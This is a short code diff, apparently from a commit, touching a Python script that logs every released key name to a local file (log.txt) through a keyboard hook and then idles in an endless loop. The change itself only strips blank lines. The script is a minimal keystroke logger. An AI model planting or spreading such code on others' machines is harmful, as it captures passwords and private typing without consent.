@@ -14,20 +14,8 @@ def key_press(event):
     with open('log.txt', 'a') as f:
         f.write('{}'.format(name))
 
-
-
-
-
+        
 keyboard.on_release(key_press)
 
 while True:
     pass
-
-
-
-
-
-
-
-
-
